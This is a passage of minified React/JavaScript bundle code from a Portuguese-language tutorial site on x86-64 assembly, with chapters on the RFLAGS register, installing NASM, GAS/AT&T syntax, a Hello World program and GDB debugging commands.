mov rdi, 0           ; addr: deixa o kernel escolher
mov rsi, 4096        ; length: 1 página (4KB)
mov rdx, 3           ; prot: PROT_READ | PROT_WRITE
mov r10, 0x22        ; flags: MAP_PRIVATE | MAP_ANONYMOUS
mov r8,  -1          ; fd: -1 (anônimo)
mov r9,  0           ; offset: 0
syscall              ; rax = ponteiro para a memória alocada

; Verificar erro
cmp rax, -1
je  .erro

mov [ponteiro], rax  ; salva o ponteiro`})]})}function Ng(){return r.jsxs(L,{title:"Registrador FLAGS",subtitle:"As flags de status que controlam o fluxo do seu programa",difficulty:"iniciante",timeToRead:"12 min",children:[r.jsxs("p",{children:["O registrador ",r.jsx("strong",{children:"RFLAGS"})," (64-bit) contém bits individuais que refletem o resultado de operações aritméticas e lógicas. As instruções de salto condicional (",r.jsx("code",{children:"JE"}),", ",r.jsx("code",{children:"JG"}),", etc.) tomam decisões baseadas nessas flags."]}),r.jsx("h2",{children:"Flags Mais Importantes"}),r.jsx("h3",{children:"Zero Flag (ZF) — Bit 6"}),r.jsxs("p",{children:["Setada (1) quando o resultado de uma operação é ",r.jsx("strong",{children:"zero"}),"."]}),r.jsx(d,{language:"nasm",code:`mov rax, 5
sub rax, 5    ; rax = 0 → ZF = 1

mov rax, 5
sub rax, 3    ; rax = 2 → ZF = 0

; Usado com:
je  label     ; Jump if Equal (ZF = 1)
jne label     ; Jump if Not Equal (ZF = 0)
jz  label     ; Jump if Zero (ZF = 1) — mesmo que JE
jnz label     ; Jump if Not Zero (ZF = 0) — mesmo que JNE`}),r.jsx("h3",{children:"Carry Flag (CF) — Bit 0"}),r.jsxs("p",{children:["Setada quando há ",r.jsx("strong",{children:"carry (transporte) ou borrow"})," em operações sem sinal. Indica overflow para números unsigned."]}),r.jsx(d,{language:"nasm",code:`; Unsigned overflow:
mov al, 255   ; al = 0xFF
add al, 1     ; al = 0x00 (overflow!), CF = 1

; Borrow:
mov al, 0
sub al, 1     ; al = 0xFF (borrow), CF = 1

; Usado com:
jc  label     ; Jump if Carry (CF = 1)
jnc label     ; Jump if No Carry (CF = 0)
jb  label     ; Jump if Below (unsigned <) — CF = 1
jae label     ; Jump if Above or Equal (unsigned >=) — CF = 0`}),r.jsx("h3",{children:"Overflow Flag (OF) — Bit 11"}),r.jsxs("p",{children:["Setada quando há ",r.jsx("strong",{children:"overflow em operação com sinal"})," (o resultado não cabe na representação de complemento de dois)."]}),r.jsx(d,{language:"nasm",code:`; Overflow em sinal:
mov al, 127   ; al = 0x7F (máximo positivo de 8-bit signed)
add al, 1     ; al = -128 (0x80), OF = 1!

mov al, -128  ; al = 0x80 (mínimo negativo)
sub al, 1     ; al = 127 (0x7F), OF = 1!

; Usado com:
jo  label     ; Jump if Overflow (OF = 1)
jno label     ; Jump if No Overflow (OF = 0)`}),r.jsx("h3",{children:"Sign Flag (SF) — Bit 7"}),r.jsx("p",{children:"Cópia do bit mais significativo do resultado. Indica se o resultado é negativo (em representação com sinal)."}),r.jsx(d,{language:"nasm",code:`mov rax, 5
sub rax, 10   ; rax = -5, SF = 1 (negativo)

mov rax, 10
sub rax, 5    ; rax = 5,  SF = 0 (positivo)

; Usado com:
js  label     ; Jump if Sign (SF = 1, resultado negativo)
jns label     ; Jump if No Sign (SF = 0, resultado positivo)`}),r.jsx("h3",{children:"Parity Flag (PF) — Bit 2"}),r.jsx("p",{children:"Setada quando o byte menos significativo do resultado tem número par de bits 1. Usada em comunicação serial e cálculos de paridade."}),r.jsx(d,{language:"nasm",code:`mov al, 0b10110011   ; 4 bits 1 → PF = 1 (par)
mov al, 0b10110001   ; 3 bits 1 → PF = 0 (ímpar)

jp  label    ; Jump if Parity (PF = 1, par)
jnp label    ; Jump if No Parity (PF = 0, ímpar)`}),r.jsx("h3",{children:"Auxiliary Carry Flag (AF) — Bit 4"}),r.jsx("p",{children:"Carry do nibble baixo para o alto. Usado principalmente em aritmética BCD (Binary-Coded Decimal)."}),r.jsx("h3",{children:"Direction Flag (DF) — Bit 10"}),r.jsxs("p",{children:["Controla a direção das operações de string (",r.jsx("code",{children:"MOVS"}),", ",r.jsx("code",{children:"CMPS"}),", ",r.jsx("code",{children:"SCAS"}),", ",r.jsx("code",{children:"LODS"}),", ",r.jsx("code",{children:"STOS"}),"):"]}),r.jsx(d,{language:"nasm",code:`cld    ; Clear Direction Flag — DF = 0 → incrementa RSI/RDI
std    ; Set Direction Flag   — DF = 1 → decrementa RSI/RDI

; ABI exige que DF = 0 ao entrar/sair de funções!`}),r.jsx("h2",{children:"Instrução CMP"}),r.jsxs("p",{children:[r.jsx("code",{children:"CMP"})," realiza uma subtração mas ",r.jsx("strong",{children:"descarta o resultado"}),", mantendo apenas as flags:"]}),r.jsx(d,{language:"nasm",filename:"cmp.asm",code:`cmp rax, rbx      ; calcula rax - rbx, seta flags, descarta resultado
; Se rax == rbx: ZF = 1, CF = 0
; Se rax <  rbx (unsigned): CF = 1
; Se rax >  rbx (unsigned): CF = 0, ZF = 0

cmp rax, 0        ; verifica se rax é zero
cmp byte [mem], 'A'  ; compara byte na memória com 'A'`}),r.jsx("h2",{children:"Instrução TEST"}),r.jsxs("p",{children:[r.jsx("code",{children:"TEST"})," realiza AND bit a bit mas ",r.jsx("strong",{children:"descarta o resultado"}),". Muito usado para verificar bits individuais:"]}),r.jsx(d,{language:"nasm",filename:"test.asm",code:`test rax, rax      ; rax AND rax — seta ZF se rax = 0
                   ; MUITO mais curto que "cmp rax, 0"

test al, 1         ; verifica bit 0 (par/ímpar)
jz  .par           ; se ZF=1, bit 0 era 0 → par

test rax, 0x80     ; verifica bit 7 (sinal)
jnz .negativo      ; se ZF=0, bit 7 era 1 → negativo`}),r.jsx("h2",{children:"Tabela de Saltos Condicionais"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Instrução"}),r.jsx("th",{children:"Condição"}),r.jsx("th",{children:"Flags"}),r.jsx("th",{children:"Tipo"})]})}),r.jsx("tbody",{children:[["JE / JZ","Igual / Zero","ZF=1","signed/unsigned"],["JNE / JNZ","Não igual / Não zero","ZF=0","signed/unsigned"],["JL / JNGE","Menor que (signed)","SF≠OF","signed"],["JLE / JNG","Menor ou igual (signed)","ZF=1 ou SF≠OF","signed"],["JG / JNLE","Maior que (signed)","ZF=0 e SF=OF","signed"],["JGE / JNL","Maior ou igual (signed)","SF=OF","signed"],["JB / JNAE / JC","Abaixo (unsigned <)","CF=1","unsigned"],["JBE / JNA","Abaixo ou igual (unsigned <=)","CF=1 ou ZF=1","unsigned"],["JA / JNBE","Acima (unsigned >)","CF=0 e ZF=0","unsigned"],["JAE / JNB / JNC","Acima ou igual (unsigned >=)","CF=0","unsigned"],["JS","Sinal negativo","SF=1","qualquer"],["JNS","Sinal positivo","SF=0","qualquer"],["JO","Overflow","OF=1","qualquer"],["JNO","Sem overflow","OF=0","qualquer"],["JP / JPE","Paridade par","PF=1","qualquer"],["JNP / JPO","Paridade ímpar","PF=0","qualquer"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:r.jsx("code",{children:u})}),r.jsx("td",{children:m})]},i))})]}),r.jsx(T,{type:"info",title:"Signed vs Unsigned",children:"Use JL/JG (signed) quando trabalhar com números que podem ser negativos. Use JB/JA (unsigned/below/above) quando trabalhar com valores sempre positivos (endereços, tamanhos, etc.)."}),r.jsx("h2",{children:"Instrução SETCC — Condicional sem Salto"}),r.jsx(d,{language:"nasm",filename:"setcc.asm",code:`; SETE, SETNE, SETL, SETG, etc. — settam um byte baseado em flags
cmp rax, rbx
sete al         ; al = 1 se rax == rbx, 0 caso contrário
setl al         ; al = 1 se rax < rbx (signed)
setb al         ; al = 1 se rax < rbx (unsigned)

; Útil para evitar branches em operações simples:
movzx eax, al   ; zero-extend o byte para 64-bit`}),r.jsx("h2",{children:"LAHF e SAHF"}),r.jsx(d,{language:"nasm",code:`lahf    ; Load AH from Flags — copia SF,ZF,AF,PF,CF para AH
sahf    ; Store AH into Flags — restaura flags de AH

pushfq  ; Empilha RFLAGS na stack
popfq   ; Desempilha RFLAGS da stack`})]})}function Lg(){return r.jsxs(L,{title:"Instalando NASM",subtitle:"Configure seu ambiente de desenvolvimento Assembly no Linux",difficulty:"iniciante",timeToRead:"10 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"NASM"})," (Netwide Assembler) é o assembler mais popular para x86/x86-64 no Linux. Usa a sintaxe Intel, que é mais legível e preferida pela maioria dos programadores."]}),r.jsx("h2",{children:"Instalação no Linux"}),r.jsx("h3",{children:"Ubuntu / Debian"}),r.jsx(d,{language:"bash",filename:"install.sh",code:`sudo apt update
sudo apt install nasm build-essential gdb -y

# Verificar instalação:
nasm --version
# NASM version 2.16.01 compiled on Dec 21 2022`}),r.jsx("h3",{children:"Arch Linux"}),r.jsx(d,{language:"bash",code:"sudo pacman -S nasm base-devel gdb"}),r.jsx("h3",{children:"Fedora / RHEL"}),r.jsx(d,{language:"bash",code:"sudo dnf install nasm gcc gdb"}),r.jsx("h2",{children:"Instalação no Windows"}),r.jsx(d,{language:"bash",code:`# Via Chocolatey:
choco install nasm

# Ou baixar o instalador em: https://www.nasm.us/pub/nasm/releasebuilds/
# Adicionar ao PATH: C:\\Program Files\\NASM`}),r.jsx("h2",{children:"Instalação no macOS"}),r.jsx(d,{language:"bash",code:`# Via Homebrew:
brew install nasm

# Verificar versão:
nasm --version`}),r.jsx("h2",{children:"Ferramentas Adicionais Necessárias"}),r.jsx(d,{language:"bash",filename:"tools.sh",code:`# Linker (geralmente já vem com o sistema):
sudo apt install binutils    # inclui ld, objdump, nm, readelf

# GDB — debugger essencial
sudo apt install gdb

# GDB com interface melhorada (opcional mas recomendado):
pip install pwndbg
# ou
sudo apt install gdb-pwndbg  # se disponível

# Alternativas ao NASM:
# GAS (GNU Assembler) — já vem com gcc
which as    # verifica se está disponível

# Utilitários de análise de binários:
sudo apt install binutils ltrace strace`}),r.jsx("h2",{children:"Estrutura de um Programa NASM"}),r.jsx("p",{children:"Todo programa NASM em Linux tem esta estrutura básica:"}),r.jsx(d,{language:"nasm",filename:"template.asm",code:`; Comentários com ponto-e-vírgula
; Seção .data: dados inicializados (constantes, strings)
section .data
    mensagem db "Olá, Mundo!", 10, 0    ; string + newline + null
    tam_msg  equ $ - mensagem           ; tamanho da string

; Seção .bss: dados não inicializados (variáveis)
section .bss
    buffer resb 64    ; reserva 64 bytes

; Seção .text: código executável
section .text
    global _start     ; exporta _start para o linker

_start:
    ; Seu código aqui
    
    ; Saída: exit(0)
    mov rax, 60       ; syscall: sys_exit
    xor rdi, rdi      ; exit code: 0
    syscall`}),r.jsx("h2",{children:"Compilando e Executando"}),r.jsx(d,{language:"bash",filename:"build.sh",code:`# Passo 1: Assemblar (converte .asm → .o)
nasm -f elf64 programa.asm -o programa.o

# Opções do NASM:
# -f elf64  → formato ELF 64-bit (Linux x86-64)
# -f elf32  → ELF 32-bit
# -f macho64 → macOS 64-bit
# -f win64  → Windows 64-bit (PE format)
# -g        → inclui informações de debug
# -l lista.txt → gera listagem assembly

# Passo 2: Linkar (converte .o → executável)
ld programa.o -o programa

# Para programas que usam libc:
ld programa.o -o programa -lc -dynamic-linker /lib64/ld-linux-x86-64.so.2

# Passo 3: Executar
./programa
echo $?   # imprime o código de saída`}),r.jsx("h2",{children:"Makefile para Assembly"}),r.jsx(d,{language:"makefile",filename:"Makefile",code:`# Makefile para projetos Assembly
ASM = nasm
ASMFLAGS = -f elf64 -g
LD = ld

SRCS = $(wildcard *.asm)
OBJS = $(SRCS:.asm=.o)
BINS = $(SRCS:.asm=)

all: $(BINS)

%.o: %.asm
	$(ASM) $(ASMFLAGS) $< -o $@

%: %.o
	$(LD) $< -o $@

clean:
	rm -f $(OBJS) $(BINS)

.PHONY: all clean`}),r.jsx("h2",{children:"Editor de Código Recomendado"}),r.jsx(T,{type:"info",title:"VS Code + NASM",children:'Instale a extensão "NASM" no VS Code para syntax highlighting. Para terminal, neovim com o plugin "vim-nasm" ou Emacs com "asm-mode" funcionam muito bem.'}),r.jsx(d,{language:"bash",code:`# VS Code (interface gráfica):
code .    # abre VS Code no diretório atual
# Instale: "NASM x86 Assembly Language Support"

# Configuração do .editorconfig para Assembly:
# indent_size = 4
# indent_style = space`}),r.jsx("h2",{children:"Verificando a Instalação"}),r.jsx(d,{language:"bash",filename:"check.sh",code:`# Verificar todas as ferramentas:
echo "=== Versões ==="
nasm --version
ld --version | head -1
gdb --version | head -1
objdump --version | head -1

# Testar com um programa mínimo:
cat > test.asm << 'EOF'
section .text
    global _start
_start:
    mov rax, 60
    xor rdi, rdi
    syscall
EOF

nasm -f elf64 test.asm -o test.o && ld test.o -o test && ./test
echo "Exit code: $?   (deve ser 0)"
rm -f test test.o test.asm`}),r.jsxs(T,{type:"success",title:"Próximo passo",children:["Com o ambiente configurado, vá para o capítulo ",r.jsx("strong",{children:"Hello World"})," para escrever seu primeiro programa Assembly funcional!"]})]})}function zg(){return r.jsxs(L,{title:"GNU Assembler (GAS) e Sintaxe AT&T",subtitle:"O assembler do projeto GNU — instalado por padrão com GCC",difficulty:"intermediario",timeToRead:"12 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"GAS"})," (GNU Assembler) é o assembler padrão do projeto GNU. Usa a ",r.jsx("strong",{children:"sintaxe AT&T"})," — diferente da Intel usada pelo NASM. GAS é chamado automaticamente quando você usa ",r.jsx("code",{children:"gcc"})," para compilar C."]}),r.jsx("h2",{children:"Por que saber GAS?"}),r.jsxs("ul",{children:[r.jsxs("li",{children:["Código de Assembly inline em C/C++ (",r.jsx("code",{children:"asm()"}),") usa sintaxe AT&T por padrão no GCC"]}),r.jsxs("li",{children:["O GCC gera Assembly em sintaxe AT&T por padrão (",r.jsx("code",{children:"gcc -S"}),")"]}),r.jsx("li",{children:"Muitos projetos open-source (Linux kernel) usam GAS"}),r.jsx("li",{children:"Entender a saída do compilador requer conhecer AT&T"})]}),r.jsx("h2",{children:"Sintaxe AT&T vs Intel — Diferenças Principais"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Característica"}),r.jsx("th",{children:"Intel (NASM)"}),r.jsx("th",{children:"AT&T (GAS)"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:"Prefixo de registrador"}),r.jsx("td",{children:r.jsx("code",{children:"rax"})}),r.jsx("td",{children:r.jsx("code",{children:"%rax"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Prefixo de imediato"}),r.jsx("td",{children:r.jsx("code",{children:"42"})}),r.jsx("td",{children:r.jsx("code",{children:"$42"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Sufixo de tamanho"}),r.jsx("td",{children:"implícito no operando"}),r.jsx("td",{children:r.jsx("code",{children:"b/w/l/q"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Ordem dos operandos"}),r.jsx("td",{children:"destino, fonte"}),r.jsx("td",{children:"fonte, destino"})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Acesso à memória"}),r.jsx("td",{children:r.jsx("code",{children:"[rax]"})}),r.jsx("td",{children:r.jsx("code",{children:"(%rax)"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Deslocamento"}),r.jsx("td",{children:r.jsx("code",{children:"[rax + 8]"})}),r.jsx("td",{children:r.jsx("code",{children:"8(%rax)"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:"Comentários"}),r.jsx("td",{children:r.jsx("code",{children:"; comentário"})}),r.jsx("td",{children:r.jsx("code",{children:"/* */ ou # ou //"})})]})]})]}),r.jsx("h2",{children:"Exemplos Comparativos"}),r.jsx(d,{language:"nasm",filename:"intel.asm",code:`; NASM (Sintaxe Intel)
mov rax, 42           ; rax = 42
mov rax, rbx          ; rax = rbx
mov rax, [rbx]        ; rax = *rbx
mov rax, [rbx + 8]    ; rax = *(rbx+8)
mov [rdi], rax        ; *rdi = rax
add rax, rbx          ; rax += rbx
movq rax, qword [rbx] ; move 64-bit`}),r.jsx(d,{language:"bash",filename:"att.s",code:`# GAS (Sintaxe AT&T)
movq $42, %rax        # rax = 42  (NOTA: fonte primeiro, destino segundo!)
movq %rbx, %rax       # rax = rbx
movq (%rbx), %rax     # rax = *rbx
movq 8(%rbx), %rax    # rax = *(rbx+8)
movq %rax, (%rdi)     # *rdi = rax
addq %rbx, %rax       # rax += rbx
movq (%rbx), %rax     # move 64-bit (sufixo 'q')`}),r.jsxs(T,{type:"warning",title:"Ordem invertida em AT&T!",children:["Em AT&T, os operandos são ",r.jsx("strong",{children:"fonte, destino"})," (o oposto da Intel). ",r.jsx("code",{children:"movq %rbx, %rax"}),' significa "mova rbx para rax" (rax = rbx). Isso é a fonte de confusão mais comum para quem vem da sintaxe Intel.']}),r.jsx("h2",{children:"Sufixos de Tamanho em AT&T"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Sufixo"}),r.jsx("th",{children:"Tamanho"}),r.jsx("th",{children:"Equivalente Intel"})]})}),r.jsxs("tbody",{children:[r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:"b"})}),r.jsx("td",{children:"byte (8-bit)"}),r.jsx("td",{children:r.jsx("code",{children:"byte"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:"w"})}),r.jsx("td",{children:"word (16-bit)"}),r.jsx("td",{children:r.jsx("code",{children:"word"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:"l"})}),r.jsx("td",{children:"long (32-bit)"}),r.jsx("td",{children:r.jsx("code",{children:"dword"})})]}),r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:"q"})}),r.jsx("td",{children:"quad (64-bit)"}),r.jsx("td",{children:r.jsx("code",{children:"qword"})})]})]})]}),r.jsx("h2",{children:"Hello World em GAS"}),r.jsx(d,{language:"bash",filename:"hello.s",code:`# hello.s — Hello World em GAS (AT&T Syntax)
.section .data
    msg:     .asciz "Hello, World!
"   # string com null terminator
    msg_len: .equ . - msg               # tamanho da string

.section .text
    .global _start

_start:
    # write(1, msg, msg_len)
    movq $1, %rax           # syscall: sys_write
    movq $1, %rdi           # fd: stdout (1)
    leaq msg(%rip), %rsi    # rsi = &msg (RIP-relative)
    movq $msg_len, %rdx     # rdx = tamanho
    syscall

    # exit(0)
    movq $60, %rax          # syscall: sys_exit
    xorq %rdi, %rdi         # exit code = 0
    syscall`}),r.jsx(d,{language:"bash",code:`# Compilar com GAS:
as hello.s -o hello.o
ld hello.o -o hello
./hello`}),r.jsx("h2",{children:"Usando GAS com GCC"}),r.jsx(d,{language:"bash",code:`# GCC como frontend para GAS:
gcc -nostdlib hello.s -o hello    # sem libc
gcc hello.s -o hello              # com libc (precisa de main, não _start)

# Ver Assembly gerado pelo GCC:
gcc -S -O2 programa.c -o programa.s
cat programa.s    # AT&T syntax por padrão

# Ver Assembly em sintaxe Intel:
gcc -S -O2 -masm=intel programa.c -o programa.s`}),r.jsx("h2",{children:"Modo Intel no GAS"}),r.jsxs("p",{children:["Você pode usar sintaxe Intel no GAS com a diretiva ",r.jsx("code",{children:".intel_syntax"}),":"]}),r.jsx(d,{language:"bash",filename:"intel_gas.s",code:`.intel_syntax noprefix    # ativa sintaxe Intel, sem prefixo % nos regs

.section .text
.global _start

_start:
    mov rax, 60       # sintaxe Intel no GAS!
    xor rdi, rdi
    syscall

.att_syntax prefix    # volta para AT&T (boa prática)`}),r.jsx("h2",{children:"Diretivas do GAS"}),r.jsx(d,{language:"bash",filename:"diretivas.s",code:`.section .data        # seção de dados
.section .text        # seção de código
.section .bss         # seção BSS

.byte 42              # define 1 byte
.word 1000            # define 2 bytes
.long 100000          # define 4 bytes
.quad 10000000        # define 8 bytes
.ascii "hello"        # string SEM null terminator
.asciz "hello"        # string COM null terminator (\0)
.string "hello"       # igual a .asciz

.align 4              # alinha ao próximo múltiplo de 4 bytes
.balign 16            # alinha ao próximo múltiplo de 16 bytes
.space 64             # reserva 64 bytes zerados
.skip 64              # igual a .space

.equ CONST, 42        # define constante (equivalente a %define no NASM)
.set CONST, 42        # igual a .equ

.global _start        # exporta símbolo
.extern funcao        # declara símbolo externo
.type funcao, @function  # declara tipo do símbolo`}),r.jsx(T,{type:"info",title:"GAS ou NASM?",children:"Para aprendizado, NASM com sintaxe Intel é mais recomendado — mais legível e mais documentação disponível. Use GAS quando precisar de inline assembly em C ou quando analisar código gerado pelo GCC."})]})}function wg(){return r.jsxs(L,{title:"Hello, World! em Assembly",subtitle:"Seu primeiro programa — linha a linha, sem mistério",difficulty:"iniciante",timeToRead:"15 min",children:[r.jsx("p",{children:'O clássico "Hello, World!" em Assembly é muito mais revelador do que em outras linguagens. Cada linha faz algo específico e ensina como o sistema operacional e o processador trabalham juntos.'}),r.jsx("h2",{children:"O Programa Completo"}),r.jsx(d,{language:"nasm",filename:"hello.asm",code:`; hello.asm — Hello World em Assembly x86-64 Linux
; Compilar: nasm -f elf64 hello.asm -o hello.o
; Linkar:   ld hello.o -o hello
; Executar: ./hello

section .data
    mensagem db "Hello, World!", 10    ; string + newline (
)
    tam_msg  equ $ - mensagem          ; tamanho = posição atual - início da string

section .text
    global _start                      ; ponto de entrada do programa

_start:
    ; write(1, mensagem, tam_msg)
    mov rax, 1          ; syscall número 1 = sys_write
    mov rdi, 1          ; argumento 1: fd = 1 (stdout)
    mov rsi, mensagem   ; argumento 2: ponteiro para a string
    mov rdx, tam_msg    ; argumento 3: número de bytes para escrever
    syscall             ; chama o kernel Linux

    ; exit(0)
    mov rax, 60         ; syscall número 60 = sys_exit
    xor rdi, rdi        ; argumento 1: exit code = 0
    syscall             ; chama o kernel Linux`}),r.jsx("h2",{children:"Linha por Linha"}),r.jsx("h3",{children:"Seção .data"}),r.jsx(d,{language:"nasm",code:'mensagem db "Hello, World!", 10'}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("code",{children:"mensagem"})," é um ",r.jsx("strong",{children:"label"})," — um nome para o endereço de memória"]}),r.jsxs("li",{children:[r.jsx("code",{children:"db"}),' = "define bytes" — aloca bytes na memória']}),r.jsxs("li",{children:[r.jsx("code",{children:'"Hello, World!"'})," são 13 bytes de texto"]}),r.jsxs("li",{children:[r.jsx("code",{children:"10"})," é o código ASCII de ",r.jsx("code",{children:"\\n"})," (newline)"]})]}),r.jsx(d,{language:"nasm",code:"tam_msg equ $ - mensagem"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("code",{children:"equ"})," define uma constante em tempo de compilação"]}),r.jsxs("li",{children:[r.jsx("code",{children:"$"})," representa o endereço atual (posição do cursor)"]}),r.jsxs("li",{children:[r.jsx("code",{children:"$ - mensagem"})," = distância entre o cursor e o label = tamanho da string = 14"]})]}),r.jsx("h3",{children:"Syscall: write()"}),r.jsxs("p",{children:["Em Linux, para escrever na tela, usamos a ",r.jsx("strong",{children:"system call"})," ",r.jsx("code",{children:"write"}),". System calls são a forma de um programa pedir serviços ao kernel."]}),r.jsx(d,{language:"c",code:`// Equivalente em C:
write(1, mensagem, tam_msg);
// write(fd, buf, count)
// fd=1: stdout (saída padrão)
// buf: endereço da string
// count: número de bytes`}),r.jsx(d,{language:"nasm",code:`mov rax, 1          ; número da syscall write = 1
mov rdi, 1          ; 1º argumento: fd = stdout
mov rsi, mensagem   ; 2º argumento: endereço da string
mov rdx, tam_msg    ; 3º argumento: tamanho
syscall             ; executa a syscall`}),r.jsxs(T,{type:"info",title:"Convenção de syscalls Linux x86-64",children:["Os argumentos da syscall vão em: ",r.jsx("strong",{children:"RAX"})," (número), ",r.jsx("strong",{children:"RDI"})," (1º), ",r.jsx("strong",{children:"RSI"})," (2º), ",r.jsx("strong",{children:"RDX"})," (3º), ",r.jsx("strong",{children:"R10"})," (4º), ",r.jsx("strong",{children:"R8"})," (5º), ",r.jsx("strong",{children:"R9"})," (6º). O retorno vem em RAX."]}),r.jsx("h3",{children:"Syscall: exit()"}),r.jsx(d,{language:"nasm",code:`mov rax, 60         ; número da syscall exit = 60
xor rdi, rdi        ; exit code = 0 (xor reg, reg é a forma idiomática de zerar)
syscall`}),r.jsxs("p",{children:[r.jsx("code",{children:"xor rdi, rdi"})," é a forma idiomática de zerar um registrador. É mais eficiente que ",r.jsx("code",{children:"mov rdi, 0"})," porque gera código menor e mais rápido."]}),r.jsx("h2",{children:"Compilando e Executando"}),r.jsx(d,{language:"bash",code:`# Passo 1: Assemblar
nasm -f elf64 hello.asm -o hello.o

# Passo 2: Linkar
ld hello.o -o hello

# Passo 3: Executar
./hello
# Saída: Hello, World!

# Ver o exit code:
echo $?    # deve imprimir 0`}),r.jsx("h2",{children:"Inspecionando o Binário"}),r.jsx(d,{language:"bash",code:`# Ver as seções do binário:
readelf -S hello

# Ver o código de máquina gerado:
objdump -d hello

# Saída do objdump:
# 0000000000401000 <_start>:
#   401000:  b8 01 00 00 00    mov eax,0x1
#   401005:  bf 01 00 00 00    mov edi,0x1
#   40100a:  48 be 00 20 40 00 00 00 00 00  movabs rsi,0x402000
#   401014:  ba 0e 00 00 00    mov edx,0xe
#   401019:  0f 05             syscall
#   40101b:  b8 3c 00 00 00    mov eax,0x3c
#   401020:  31 ff             xor edi,edi
#   401022:  0f 05             syscall`}),r.jsx("h2",{children:"Versão com Número de Argumento"}),r.jsx(d,{language:"nasm",filename:"hello_v2.asm",code:`; Hello World mais elaborado — imprime com contagem
section .data
    msg1 db "Tentativa ", 0
    msg2 db "de 3: Hello, World!", 10, 0

    msg_len1 equ $ - msg1 - 1    ; tamanho sem o null
    msg_len2 equ $ - msg2 - 1

section .text
    global _start

_start:
    ; Escrever "Tentativa "
    mov rax, 1
    mov rdi, 1
    mov rsi, msg1
    mov rdx, msg_len1
    syscall

    ; Escrever o número '1' (ASCII 49)
    mov rax, 1
    mov rdi, 1
    mov rsi, numero
    mov rdx, 1
    syscall

    ; Escrever " de 3: Hello, World!
"
    mov rax, 1
    mov rdi, 1
    mov rsi, msg2
    mov rdx, msg_len2
    syscall

    ; exit(0)
    mov rax, 60
    xor rdi, rdi
    syscall

section .data
    numero db "1"`}),r.jsx("h2",{children:"Variações Úteis"}),r.jsx(d,{language:"nasm",filename:"exit_code.asm",code:`; Sair com código diferente de 0 (indica erro):
_start:
    mov rax, 60
    mov rdi, 1     ; exit code = 1 (erro genérico)
    syscall

; No shell:
; ./programa
; echo $?    → imprime 1`}),r.jsx(T,{type:"success",title:"Parabéns!",children:"Você escreveu seu primeiro programa Assembly! A partir daqui, cada conceito novo adiciona poder ao que você pode fazer. Continue para as instruções fundamentais."})]})}function Xg(){return r.jsxs(L,{title:"GDB — Debugging Assembly",subtitle:"Use o GNU Debugger para inspecionar registradores, memória e executar passo a passo",difficulty:"intermediario",timeToRead:"20 min",children:[r.jsx("p",{children:"O GDB (GNU Debugger) é sua ferramenta mais importante para entender Assembly. Ele permite pausar a execução, inspecionar registradores e memória, e executar instrução por instrução."}),r.jsx("h2",{children:"Compilando com Informações de Debug"}),r.jsx(d,{language:"bash",code:`# Sempre compilar com -g para debug!
nasm -f elf64 -g -F dwarf programa.asm -o programa.o
ld programa.o -o programa

# -g: inclui informações de debug
# -F dwarf: formato de debug DWARF (padrão Linux)`}),r.jsx("h2",{children:"Iniciando o GDB"}),r.jsx(d,{language:"bash",code:`# Carregar programa no GDB:
gdb ./programa

# Direto com breakpoint no _start:
gdb -ex 'break _start' -ex 'run' ./programa

# Com pwndbg instalado (interface melhorada):
gdb ./programa    # pwndbg ativa automaticamente`}),r.jsx("h2",{children:"Comandos Essenciais do GDB"}),r.jsx(d,{language:"bash",filename:"gdb_comandos.txt",code:`# === CONTROLE DE EXECUÇÃO ===
run (r)              # executa o programa
run arg1 arg2        # executa com argumentos
continue (c)         # continua até próximo breakpoint
step (s)             # executa próxima linha (entra em funções)
next (n)             # executa próxima linha (não entra em funções)
stepi (si)           # executa próxima INSTRUÇÃO (essencial para Assembly!)
nexti (ni)           # próxima instrução sem entrar em calls
finish               # executa até sair da função atual
kill                 # mata o processo
quit (q)             # sai do GDB

# === BREAKPOINTS ===
break _start         # breakpoint no label _start
break *0x401000      # breakpoint em endereço específico
break *(_start + 10) # breakpoint relativo ao label
info breakpoints     # lista breakpoints
delete 1             # apaga breakpoint 1
disable 1            # desabilita breakpoint 1
enable 1             # habilita breakpoint 1
watch rax            # watchpoint: para quando rax mudar
watch *0x601000      # watchpoint em endereço de memória`}),r.jsx("h2",{children:"Inspecionando Registradores"}),r.jsx(d,{language:"bash",filename:"gdb_regs.txt",code:`# Ver todos os registradores:
info registers (i r)

# Registradores específicos:
info registers rax rbx rcx
print $rax          # imprime valor de rax
p/x $rax            # imprime em hexadecimal
p/d $rax            # imprime em decimal
p/b $rax            # imprime em binário
p/c $rax            # interpreta como char

# Registradores especiais:
info registers rip   # Instruction Pointer
info registers rsp   # Stack Pointer
info registers rbp   # Base Pointer
info registers eflags  # FLAGS register

# Ver todos de uma vez:
info all-registers`}),r.jsx("h2",{children:"Inspecionando Memória"}),r.jsx(d,{language:"bash",filename:"gdb_mem.txt",code:`# Sintaxe: x/<count><format><size> <address>
# format: x=hex, d=decimal, s=string, i=instructions, b=binary, c=char
# size:   b=byte, h=halfword(2), w=word(4), g=giant(8)

x/1gx $rsp          # 1 qword em hex no topo da stack
x/8gx $rsp          # 8 qwords em hex (top of stack)
x/4xb $rax          # 4 bytes em hex no endereço rax
x/s $rsi            # string no endereço rsi
x/20i $rip          # próximas 20 instruções (desmonta)
x/1i $rip           # próxima instrução

# Exemplos práticos:
